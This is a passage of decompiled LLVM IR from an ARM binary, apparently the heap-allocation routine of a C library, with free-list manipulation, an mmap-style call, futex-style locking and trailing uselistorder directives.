  %v1_140d0 = load i32, i32* @r5, align 4
  %v2_140d0 = add i32 %v1_140d0, 4
  %v3_140d0 = inttoptr i32 %v2_140d0 to i32*
  store i32 %v0_140d0, i32* %v3_140d0, align 4
  %v0_140d4 = load i32, i32* @r3, align 4
  %v1_140d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_140d4 = load i32, i32* @r8, align 4
  %v3_140d4 = add i32 %v2_140d4, %v1_140d4
  %v4_140d4 = inttoptr i32 %v3_140d4 to i32*
  store i32 %v0_140d4, i32* %v4_140d4, align 4
  %v0_140d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_140d8 = add i32 %v0_140d8, 8
  store i32 %v1_140d8, i32* %r0.global-to-local, align 4
  %v1_140dc = call i32 @function_137cc(i32 %v1_140d8)
  store i32 %v1_140dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f6c

dec_label_pc_140e4:                               ; preds = %dec_label_pc_13de4
  %v1_140e4 = add i32 %v0_140e4, -39
  %v3_140e4 = sub i32 38, %v0_140e4
  %v4_140e4 = and i32 %v3_140e4, %v0_140e4
  %v5_140e4 = icmp slt i32 %v4_140e4, 0
  %v6_140e4 = icmp slt i32 %v1_140e4, 0
  %v7_140e4 = icmp eq i32 %v0_140e4, 39
  %v3_140e8 = xor i1 %v6_140e4, %v5_140e4
  %v4_140e8 = or i1 %v7_140e4, %v3_140e8
  br i1 %v4_140e8, label %dec_label_pc_14138, label %dec_label_pc_140ec

dec_label_pc_140ec:                               ; preds = %dec_label_pc_140e4
  %v0_140ec = load i32, i32* @sb, align 4
  %v1_140ec = add i32 %v0_140ec, 3
  store i32 %v1_140ec, i32* %r3.global-to-local, align 4
  %v2_140f0 = sub i32 %v1_140ec, %v0_140e4
  %v4_140f0 = xor i32 %v1_140ec, %v0_140e4
  %v5_140f0 = xor i32 %v2_140f0, %v1_140ec
  %v6_140f0 = and i32 %v5_140f0, %v4_140f0
  %v7_140f0 = icmp slt i32 %v6_140f0, 0
  %v8_140f0 = icmp slt i32 %v2_140f0, 0
  %v9_140f0 = icmp eq i32 %v1_140ec, %v0_140e4
  %v3_140f4 = xor i1 %v8_140f0, %v7_140f0
  %v4_140f4 = or i1 %v9_140f0, %v3_140f4
  br i1 %v4_140f4, label %dec_label_pc_140f8, label %dec_label_pc_14204

dec_label_pc_140f8:                               ; preds = %dec_label_pc_140ec
  %v1_140f8 = add i32 %v7_13dc0, 4
  %v2_140f8 = inttoptr i32 %v1_140f8 to i32*
  %v3_140f8 = load i32, i32* %v2_140f8, align 4
  store i32 %v3_140f8, i32* %r3.global-to-local, align 4
  store i32 %v0_140b8, i32* %r2.global-to-local, align 4
  %v1_14100 = and i32 %v3_140f8, -2
  store i32 %v1_14100, i32* @r7, align 4
  %v2_14104 = sub i32 %v1_14100, %v0_140b8
  store i32 %v2_14104, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14108

dec_label_pc_14108:                               ; preds = %dec_label_pc_1420c, %dec_label_pc_140f8
  %v0_14108 = phi i32 [ %v2_14218, %dec_label_pc_1420c ], [ %v2_14104, %dec_label_pc_140f8 ]
  %v3_14108 = udiv i32 %v0_14108, 16
  store i32 %v3_14108, i32* %r3.global-to-local, align 4
  %v1_1410c = add nsw i32 %v3_14108, -1
  store i32 %v1_1410c, i32* @r0, align 4
  %tmp82 = icmp ult i32 %v1_1410c, 33
  br i1 %tmp82, label %dec_label_pc_14138, label %dec_label_pc_14118

dec_label_pc_14118:                               ; preds = %dec_label_pc_14108
  %tmp83 = icmp ugt i32 %v1_1410c, 7168
  br i1 %tmp83, label %.thread45, label %dec_label_pc_14124

.thread45:                                        ; preds = %dec_label_pc_14118
  store i32 63, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14130

dec_label_pc_14124:                               ; preds = %dec_label_pc_14118
  %v0_14124 = call i32 @function_175bc()
  %v3_14128 = udiv i32 %v0_14124, 2097152
  %v1_1412c = add nsw i32 %v3_14128, -496
  store i32 %v1_1412c, i32* %r0.global-to-local, align 4
  %v0_14130.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_14130

dec_label_pc_14130:                               ; preds = %.thread45, %dec_label_pc_14124
  %v1_14130 = phi i32 [ %v1_1412c, %dec_label_pc_14124 ], [ 63, %.thread45 ]
  %v0_14130 = phi i32 [ %v0_14130.pre, %dec_label_pc_14124 ], [ %v0_140e4, %.thread45 ]
  %v9_14130 = icmp eq i32 %v0_14130, %v1_14130
  br i1 %v9_14130, label %dec_label_pc_142ac, label %dec_label_pc_14130.dec_label_pc_14138_crit_edge

dec_label_pc_14130.dec_label_pc_14138_crit_edge:  ; preds = %dec_label_pc_14130
  %v0_14138.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14138

dec_label_pc_14138:                               ; preds = %dec_label_pc_14130.dec_label_pc_14138_crit_edge, %dec_label_pc_14204, %dec_label_pc_1420c, %dec_label_pc_14108, %dec_label_pc_140e4
  %v1_14250 = phi i32 [ %v0_14130, %dec_label_pc_14130.dec_label_pc_14138_crit_edge ], [ %v0_140e4, %dec_label_pc_14204 ], [ 63, %dec_label_pc_1420c ], [ %v0_140e4, %dec_label_pc_14108 ], [ %v0_140e4, %dec_label_pc_140e4 ]
  %v0_14138 = phi i32 [ %v0_14138.pre, %dec_label_pc_14130.dec_label_pc_14138_crit_edge ], [ %v7_13dc0, %dec_label_pc_14204 ], [ %v7_13dc0, %dec_label_pc_1420c ], [ %v7_13dc0, %dec_label_pc_14108 ], [ %v7_13dc0, %dec_label_pc_140e4 ]
  %v1_14138 = add i32 %v0_14138, 8
  store i32 %v1_14138, i32* %r3.global-to-local, align 4
  %v1_1413c = inttoptr i32 %v1_14138 to i32*
  %v2_1413c = load i32, i32* %v1_1413c, align 4
  store i32 %v2_1413c, i32* %r3.global-to-local, align 4
  %v3_1413c = add i32 %v0_14138, 12
  %v4_1413c = inttoptr i32 %v3_1413c to i32*
  %v5_1413c = load i32, i32* %v4_1413c, align 4
  store i32 %v5_1413c, i32* %ip.global-to-local, align 4
  %v9_14140 = icmp eq i32 %v5_1413c, %v2_1413c
  br i1 %v9_14140, label %dec_label_pc_1423c, label %dec_label_pc_14148

dec_label_pc_14148:                               ; preds = %dec_label_pc_14138, %dec_label_pc_142a0
  %v1_14150 = phi i32 [ %v5_1413c, %dec_label_pc_14138 ], [ %v5_142a4, %dec_label_pc_142a0 ]
  %v0_14150 = phi i32 [ %v2_1413c, %dec_label_pc_14138 ], [ %v2_142a4, %dec_label_pc_142a0 ]
  %v0_14148 = phi i32 [ %v0_14138, %dec_label_pc_14138 ], [ %v0_142a0, %dec_label_pc_142a0 ]
  %v1_14148 = add i32 %v0_14148, 4
  %v2_14148 = inttoptr i32 %v1_14148 to i32*
  %v3_14148 = load i32, i32* %v2_14148, align 4
  %v1_1414c = or i32 %v3_14148, 1
  store i32 %v1_1414c, i32* %r2.global-to-local, align 4
  %v2_14150 = add i32 %v1_14150, 8
  %v3_14150 = inttoptr i32 %v2_14150 to i32*
  store i32 %v0_14150, i32* %v3_14150, align 4
  %v0_14154 = load i32, i32* %r2.global-to-local, align 4
  %v1_14154 = and i32 %v0_14154, -2
  store i32 %v1_14154, i32* @r0, align 4
  %v1_14158 = load i32, i32* @r5, align 4
  %v2_14158 = add i32 %v1_14158, %v1_14154
  %v3_14158 = inttoptr i32 %v2_14158 to i32*
  %v4_14158 = load i32, i32* %v3_14158, align 4
  store i32 %v4_14158, i32* %r3.global-to-local, align 4
  %v1_1415c = add i32 %v1_14158, 8
  %v2_1415c = inttoptr i32 %v1_1415c to i32*
  %v3_1415c = load i32, i32* %v2_1415c, align 4
  store i32 %v3_1415c, i32* %r1.global-to-local, align 4
  %v1_14160 = or i32 %v4_14158, 1
  store i32 %v1_14160, i32* %r3.global-to-local, align 4
  %v0_14164 = load i32, i32* %ip.global-to-local, align 4
  %v2_14164 = add i32 %v3_1415c, 12
  %v3_14164 = inttoptr i32 %v2_14164 to i32*
  store i32 %v0_14164, i32* %v3_14164, align 4
  %v0_14168 = load i32, i32* %r3.global-to-local, align 4
  %v1_14168 = load i32, i32* @r0, align 4
  %v2_14168 = load i32, i32* @r5, align 4
  %v3_14168 = add i32 %v2_14168, %v1_14168
  %v4_14168 = inttoptr i32 %v3_14168 to i32*
  store i32 %v0_14168, i32* %v4_14168, align 4
  %v0_1416c = load i32, i32* %r2.global-to-local, align 4
  %v1_1416c = load i32, i32* @r5, align 4
  %v2_1416c = add i32 %v1_1416c, 4
  %v3_1416c = inttoptr i32 %v2_1416c to i32*
  store i32 %v0_1416c, i32* %v3_1416c, align 4
  %v0_14170 = load i32, i32* @r5, align 4
  store i32 %v0_14170, i32* @r8, align 4
  br label %dec_label_pc_14174

dec_label_pc_14174:                               ; preds = %dec_label_pc_142ac, %dec_label_pc_14148
  %v0_14174 = load i32, i32* @r6, align 4
  %v1_14174 = add i32 %v0_14174, 8
  store i32 %v1_14174, i32* %r2.global-to-local, align 4
  %v1_14178 = load i32, i32* @sl, align 4
  %v2_14178 = add i32 %v1_14178, %v1_14174
  %v3_14178 = inttoptr i32 %v2_14178 to i32*
  %v4_14178 = load i32, i32* %v3_14178, align 4
  store i32 %v4_14178, i32* %r3.global-to-local, align 4
  %v2_1417c = icmp eq i32 %v4_14178, 0
  store i1 %v2_1417c, i1* @cpsr_z, align 1
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_14178, i32* @r4, align 4
  br i1 %v2_1417c, label %dec_label_pc_13f54, label %dec_label_pc_1418c

dec_label_pc_1418c:                               ; preds = %dec_label_pc_14174
  %v0_1418c = call i32 @function_15ce4()
  store i32 %v0_1418c, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14194 = load i32, i32* %r2.global-to-local, align 4
  %v2_14194 = load i32, i32* %r1.global-to-local, align 4
  %v3_14194 = add i32 %v2_14194, %v1_14194
  %v4_14194 = inttoptr i32 %v3_14194 to i32*
  store i32 0, i32* %v4_14194, align 4
  %v0_14198 = call i32 @function_15ce4()
  store i32 %v0_14198, i32* %r0.global-to-local, align 4
  %v0_1419c = load i32, i32* @r6, align 4
  %v1_1419c = add i32 %v0_1419c, 12
  store i32 %v1_1419c, i32* %r3.global-to-local, align 4
  %v1_141a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_141a0 = add i32 %v1_141a0, %v1_1419c
  %v3_141a0 = inttoptr i32 %v2_141a0 to i32*
  %v4_141a0 = load i32, i32* %v3_141a0, align 4
  store i32 %v4_141a0, i32* %r2.global-to-local, align 4
  %v2_141a4 = icmp eq i32 %v4_141a0, 0
  br i1 %v2_141a4, label %dec_label_pc_13f54, label %dec_label_pc_141ac

dec_label_pc_141ac:                               ; preds = %dec_label_pc_1418c
  store i32 240, i32* @r7, align 4
  %v0_141b0 = load i32, i32* @r4, align 4
  store i32 %v0_141b0, i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_141c4 = icmp eq i32 %v0_141b0, -38
  br i1 %v4_141c4, label %dec_label_pc_141c8, label %dec_label_pc_13f54

dec_label_pc_141c8:                               ; preds = %dec_label_pc_141ac
  store i32 -38, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13f54

dec_label_pc_141d8:                               ; preds = %dec_label_pc_13ef4
  store i32 240, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_223fc.580 to i32), i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  %v0_141e4 = load i32, i32* @r4, align 4
  store i32 %v0_141e4, i32* %r2.global-to-local, align 4
  br i1 icmp ne (i32 ptrtoint (i32* @global_var_223fc.580 to i32), i32 -38), label %dec_label_pc_13f10, label %dec_label_pc_141f4

dec_label_pc_141f4:                               ; preds = %dec_label_pc_141d8
  store i32 %v0_141e4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223fc.580 to i32), i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f10

dec_label_pc_14204:                               ; preds = %dec_label_pc_140ec
  %v7_14204 = icmp eq i32 %v0_140e4, 63
  br i1 %v7_14204, label %dec_label_pc_1420c, label %dec_label_pc_14138

dec_label_pc_1420c:                               ; preds = %dec_label_pc_14204
  %v1_1420c = add i32 %v7_13dc0, 4
  %v2_1420c = inttoptr i32 %v1_1420c to i32*
  %v3_1420c = load i32, i32* %v2_1420c, align 4
  store i32 %v3_1420c, i32* %r3.global-to-local, align 4
  store i32 %v0_140b8, i32* %r1.global-to-local, align 4
  %v1_14214 = and i32 %v3_1420c, -2
  store i32 %v1_14214, i32* @r7, align 4
  %v2_14218 = sub i32 %v1_14214, %v0_140b8
  store i32 %v2_14218, i32* %r4.global-to-local, align 4
  %tmp84 = icmp ult i32 %v2_14218, 114689
  br i1 %tmp84, label %dec_label_pc_14138, label %dec_label_pc_14108

dec_label_pc_14228:                               ; preds = %dec_label_pc_13e90
  %v2_14228 = load i32, i32* @global_var_223fc.580, align 4
  store i32 %v2_14228, i32* @r3, align 4
  %v2_1422c = icmp eq i32 %v2_14228, 0
  store i1 %v2_1422c, i1* @cpsr_z, align 1
  br i1 %v2_1422c, label %dec_label_pc_14234, label %dec_label_pc_14360

dec_label_pc_14234:                               ; preds = %.thread14, %dec_label_pc_14228, %dec_label_pc_14378, %dec_label_pc_14360
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_13f70

dec_label_pc_1423c:                               ; preds = %dec_label_pc_14138
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_14240 = sub i32 32, %v1_14250
  store i32 %v1_14240, i32* %r1.global-to-local, align 4
  %v7_14248 = lshr i32 1, %v1_14240
  store i32 %v7_14248, i32* %r4.global-to-local, align 4
  %v1_1424c = add i32 %v1_14250, -32
  store i32 %v1_1424c, i32* %r0.global-to-local, align 4
  %v6_1424c = icmp slt i32 %v1_1424c, 0
  %v7_1424c = icmp eq i32 %v1_14250, 32
  store i1 %v7_1424c, i1* @cpsr_z, align 1
  %v6_14250 = shl i32 1, %v1_14250
  store i32 %v6_14250, i32* %r3.global-to-local, align 4
  br i1 %v6_1424c, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_1423c
  %v7_14254 = shl i32 1, %v1_1424c
  store i32 %v7_14254, i32* %r4.global-to-local, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_1423c, %bb66
  %v0_14260 = phi i32 [ %v7_14248, %dec_label_pc_1423c ], [ %v7_14254, %bb66 ]
  %v1_14258 = sub i32 -1, %v6_14250
  store i32 %v1_14258, i32* @r7, align 4
  %v1_14260 = sub i32 -1, %v0_14260
  store i32 %v1_14260, i32* @r8, align 4
  store i32 %v1_14258, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14268

dec_label_pc_14268:                               ; preds = %dec_label_pc_14268.dec_label_pc_14268_crit_edge, %bb67
  %v1_14270 = phi i32 [ %v1_14270.pre, %dec_label_pc_14268.dec_label_pc_14268_crit_edge ], [ %v1_14258, %bb67 ]
  %v2_14268 = load i32, i32* @global_var_22408.562, align 4
  store i32 %v2_14268, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r2.global-to-local, align 4
  %v2_14270 = and i32 %v2_14268, %v1_14270
  store i32 %v2_14270, i32* %r1.global-to-local, align 4
  %v4_14274 = call i32 @function_15d38(i32 %v2_14268, i32 %v2_14270, i32* nonnull @global_var_22408.562)
  store i32 %v4_14274, i32* %r0.global-to-local, align 4
  %v2_14278 = icmp eq i32 %v4_14274, 0
  store i1 %v2_14278, i1* @cpsr_z, align 1
  br i1 %v2_14278, label %dec_label_pc_14280, label %dec_label_pc_14268.dec_label_pc_14268_crit_edge

dec_label_pc_14268.dec_label_pc_14268_crit_edge:  ; preds = %dec_label_pc_14268
  %v1_14270.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14268

dec_label_pc_14280:                               ; preds = %dec_label_pc_14268
  store i32 ptrtoint (i32* @global_var_2240c.564 to i32), i32* @sb, align 4
  %v0_14284 = load i32, i32* @r8, align 4
  store i32 %v0_14284, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14288

dec_label_pc_14288:                               ; preds = %dec_label_pc_14288.dec_label_pc_14288_crit_edge, %dec_label_pc_14280
  %v1_14290 = phi i32 [ %v1_14290.pre, %dec_label_pc_14288.dec_label_pc_14288_crit_edge ], [ %v0_14284, %dec_label_pc_14280 ]
  %v2_14288 = load i32, i32* @global_var_2240c.564, align 4
  store i32 %v2_14288, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2240c.564 to i32), i32* %r2.global-to-local, align 4
  %v2_14290 = and i32 %v2_14288, %v1_14290
  store i32 %v2_14290, i32* %r1.global-to-local, align 4
  %v4_14294 = call i32 @function_15d38(i32 %v2_14288, i32 %v2_14290, i32* nonnull @global_var_2240c.564)
  store i32 %v4_14294, i32* %r0.global-to-local, align 4
  %v2_14298 = icmp eq i32 %v4_14294, 0
  store i1 %v2_14298, i1* @cpsr_z, align 1
  br i1 %v2_14298, label %dec_label_pc_142a0, label %dec_label_pc_14288.dec_label_pc_14288_crit_edge

dec_label_pc_14288.dec_label_pc_14288_crit_edge:  ; preds = %dec_label_pc_14288
  %v1_14290.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14288

dec_label_pc_142a0:                               ; preds = %dec_label_pc_14288
  %v0_142a0 = load i32, i32* @r5, align 4
  %v1_142a0 = add i32 %v0_142a0, 8
  store i32 %v1_142a0, i32* %r3.global-to-local, align 4
  %v1_142a4 = inttoptr i32 %v1_142a0 to i32*
  %v2_142a4 = load i32, i32* %v1_142a4, align 4
  store i32 %v2_142a4, i32* %r3.global-to-local, align 4
  %v3_142a4 = add i32 %v0_142a0, 12
  %v4_142a4 = inttoptr i32 %v3_142a4 to i32*
  %v5_142a4 = load i32, i32* %v4_142a4, align 4
  store i32 %v5_142a4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14148

dec_label_pc_142ac:                               ; preds = %dec_label_pc_14130
  store i32 %v0_140b8, i32* %ip.global-to-local, align 4
  %v0_142b0 = load i32, i32* @r5, align 4
  %v1_142b0 = add i32 %v0_142b0, 12
  %v2_142b0 = inttoptr i32 %v1_142b0 to i32*
  %v3_142b0 = load i32, i32* %v2_142b0, align 4
  store i32 %v3_142b0, i32* @r0, align 4
  %v1_142b4 = add i32 %v0_142b0, 8
  %v2_142b4 = inttoptr i32 %v1_142b4 to i32*
  %v3_142b4 = load i32, i32* %v2_142b4, align 4
  store i32 %v3_142b4, i32* %r2.global-to-local, align 4
  %v2_142b8 = add i32 %v0_142b0, %v0_140b8
  store i32 %v2_142b8, i32* %r3.global-to-local, align 4
  %v2_142bc = add i32 %v2_142b8, 8
  %v3_142bc = inttoptr i32 %v2_142bc to i32*
  store i32 %v3_142b4, i32* %v3_142bc, align 4
  %v0_142c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_142c0 = load i32, i32* @r0, align 4
  %v2_142c0 = add i32 %v1_142c0, 8
  %v3_142c0 = inttoptr i32 %v2_142c0 to i32*
  store i32 %v0_142c0, i32* %v3_142c0, align 4
  %v0_142c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_142c4 = add i32 %v0_142c4, 8
  %v2_142c4 = inttoptr i32 %v1_142c4 to i32*
  %v3_142c4 = load i32, i32* %v2_142c4, align 4
  store i32 %v3_142c4, i32* %r1.global-to-local, align 4
  %v0_142c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_142c8 = or i32 %v0_142c8, 1
  store i32 %v1_142c8, i32* %r2.global-to-local, align 4
  %v0_142cc = load i32, i32* @r5, align 4
  store i32 %v0_142cc, i32* @r8, align 4
  %v0_142d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_142d0 = add i32 %v0_142c4, 4
  %v3_142d0 = inttoptr i32 %v2_142d0 to i32*
  store i32 %v0_142d0, i32* %v3_142d0, align 4
  %v0_142d4 = load i32, i32* @r0, align 4
  %v1_142d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_142d4 = add i32 %v1_142d4, 12
  %v3_142d4 = inttoptr i32 %v2_142d4 to i32*
  store i32 %v0_142d4, i32* %v3_142d4, align 4
  %v0_142d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_142d8 = load i32, i32* @r5, align 4
  %v2_142d8 = load i32, i32* %ip.global-to-local, align 4
  %v3_142d8 = add i32 %v2_142d8, %v1_142d8
  %v4_142d8 = inttoptr i32 %v3_142d8 to i32*
  store i32 %v0_142d8, i32* %v4_142d8, align 4
  %v0_142dc = load i32, i32* %r2.global-to-local, align 4
  %v1_142dc = load i32, i32* @r5, align 4
  %v2_142dc = add i32 %v1_142dc, 4
  %v3_142dc = inttoptr i32 %v2_142dc to i32*
  store i32 %v0_142dc, i32* %v3_142dc, align 4
  %v0_142e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_142e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_142e0 = add i32 %v1_142e0, 12
  %v3_142e0 = inttoptr i32 %v2_142e0 to i32*
  store i32 %v0_142e0, i32* %v3_142e0, align 4
  %v0_142e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_142e4 = load i32, i32* @r7, align 4
  %v2_142e4 = load i32, i32* @r5, align 4
  %v3_142e4 = add i32 %v2_142e4, %v1_142e4
  %v4_142e4 = inttoptr i32 %v3_142e4 to i32*
  store i32 %v0_142e4, i32* %v4_142e4, align 4
  br label %dec_label_pc_14174

dec_label_pc_142ec:                               ; preds = %dec_label_pc_14074
  %v1_142f0 = add i32 %v1_14078, 4103
  %v1_142f8 = and i32 %v1_142f0, -4096
  store i32 %v1_142f8, i32* @r6, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  store i32 %v1_142f8, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v7_14324 = call i32 @function_14644(i32 0, i32 %v1_142f8, i32 3, i32 34, i32 -1, i32 0, i32 0)
  store i32 %v7_14324, i32* %r0.global-to-local, align 4
  %v3_14328 = icmp eq i32 %v7_14324, -1
  %v8_14328 = icmp eq i32 %v7_14324, -1
  br i1 %v8_14328, label %.thread14, label %bb68

bb68:                                             ; preds = %dec_label_pc_142ec
  %v2_1432c = add i32 %v7_14324, 8
  store i32 %v2_1432c, i32* @r3, align 4
  %v1_14330 = load i32, i32* @r6, align 4
  %v2_14330 = add i32 %v1_14330, -8
  store i32 %v2_14330, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_14338 = add i32 %v7_14324, 16
  store i32 %v2_14338, i32* @ip, align 4
  %v4_1433c = inttoptr i32 %v2_1432c to i32*
  store i32 8, i32* %v4_1433c, align 4
  %v1_14340 = load i32, i32* %r1.global-to-local, align 4
  %v2_14340 = load i32, i32* @r3, align 4
  %v3_14340 = add i32 %v2_14340, 4
  %v4_14340 = inttoptr i32 %v3_14340 to i32*
  store i32 %v1_14340, i32* %v4_14340, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_142ec, %bb68
  br i1 %v3_14328, label %dec_label_pc_14234, label %dec_label_pc_13f70

dec_label_pc_1434c:                               ; preds = %dec_label_pc_13ce4
  %v0_1434c = call i32 @function_12f18()
  store i32 %v0_1434c, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* @ip, align 4
  %v2_14358 = inttoptr i32 %v0_1434c to i32*
  store i32 12, i32* %v2_14358, align 4
  br label %dec_label_pc_13f70

dec_label_pc_14360:                               ; preds = %dec_label_pc_14228
  %v0_14360 = call i32 @function_15ce4()
  store i32 %v0_14360, i32* @r0, align 4
  %v0_14364 = load i32, i32* %r4.global-to-local, align 4
  %v1_14364 = load i32, i32* @r6, align 4
  %v2_14364 = inttoptr i32 %v1_14364 to i32*
  store i32 %v0_14364, i32* %v2_14364, align 4
  %v0_14368 = call i32 @function_15ce4()
  store i32 %v0_14368, i32* %r0.global-to-local, align 4
  %v3_1436c = load i32, i32* @global_var_22400.583, align 4
  store i32 %v3_1436c, i32* @r3, align 4
  %v2_14370 = icmp eq i32 %v3_1436c, 0
  br i1 %v2_14370, label %dec_label_pc_14234, label %dec_label_pc_14378

dec_label_pc_14378:                               ; preds = %dec_label_pc_14360
  store i32 ptrtoint (i32* @global_var_223fc.580 to i32), i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 icmp ne (i32 ptrtoint (i32* @global_var_223fc.580 to i32), i32 -38), label %dec_label_pc_14234, label %dec_label_pc_14394

dec_label_pc_14394:                               ; preds = %dec_label_pc_14378
  store i32 ptrtoint (i32* @global_var_223fc.580 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_143a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_143a0, i32* @ip, align 4
  br label %dec_label_pc_13f70

; uselistorder directives
  uselistorder i32 %v7_14324, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_142a4, { 1, 0 }
  uselistorder i32 %v2_142a4, { 1, 0 }
  uselistorder i32 %v0_142a0, { 1, 2, 0 }
  uselistorder i32 %v2_14288, { 1, 0, 2 }
  uselistorder i32 %v2_14268, { 1, 0, 2 }
  uselistorder i32 %v1_14258, { 2, 1, 0 }
  uselistorder i32 %v1_1424c, { 0, 2, 1 }
  uselistorder i32 %v2_14218, { 0, 2, 1 }
  uselistorder i32 %v1_14158, { 1, 0 }
  uselistorder i32 %v0_14138, { 0, 2, 1 }
  uselistorder i32 %v3_14108, { 1, 0 }
  uselistorder i32 %v2_140f0, { 1, 0 }
  uselistorder i32 %v1_140ec, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_140ac, { 1, 0 }
  uselistorder i32 %v3_140a8, { 1, 0 }
  uselistorder i32 %v1_1408c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_14088, { 1, 0 }
  uselistorder i32 %v1_14078, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v0_13fa8, { 1, 0 }
  uselistorder i32 %v1_13f1c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_13ed4, { 1, 0, 2 }
  uselistorder i32 %v2_13e94, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32 %v2_13e68, { 0, 2, 1 }
  uselistorder i32 %v2_13e64, { 0, 2, 1 }
  uselistorder i32 %v4_13dcc, { 1, 0 }
  uselistorder i32 %v7_13dc0, { 5, 0, 1, 2, 3, 4, 6, 7, 8 }
  uselistorder i32 %v4_13dc0, { 0, 2, 1 }
  uselistorder i32 %v0_140e4, { 5, 8, 7, 6, 9, 3, 11, 4, 0, 10, 2, 1, 12 }
  uselistorder i32 %v1_13db4, { 0, 2, 1 }
  uselistorder i32 %v3_13da8, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v0_13fc8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13d50, { 1, 0 }
  uselistorder i32 %v6_13d18, { 1, 2, 0 }
  uselistorder i32 %v1_13d14, { 1, 2, 0 }
  uselistorder i32 %v0_140b8, { 0, 7, 6, 5, 9, 8, 2, 1, 3, 10, 12, 11, 4, 13 }
  uselistorder i32 %v1_13d10, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 12, 13, 7, 8, 0, 1, 2, 3, 4, 5, 6, 9, 10, 11, 14, 15, 16, 17, 18 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0, 46 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0, 41, 42 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 26, 20, 22, 21, 23, 25, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 8, 7, 15, 9, 10, 11, 12, 14, 13, 16, 17, 18, 0, 19, 20, 21, 22, 24, 23, 29, 27, 26, 25, 28, 34, 32, 31, 30, 33, 43, 35, 36, 37, 39, 38, 40, 41, 42 }
  uselistorder i32 38, { 3, 4, 5, 8, 6, 7, 0, 9, 1, 10, 2, 11 }
  uselistorder i32 ()* @function_175bc, { 4, 1, 2, 3, 0 }
  uselistorder i32 (i32*)* @function_132ac, { 1, 0 }
  uselistorder i32* @global_var_223fc.580, { 3, 1, 4, 2, 5, 0, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_223fc.580 to i32), { 1, 2, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_22408.562 to i32), i32 -8), { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 134217728, { 0, 1, 4, 2, 3 }
  uselistorder i32 124511785, { 1, 0 }
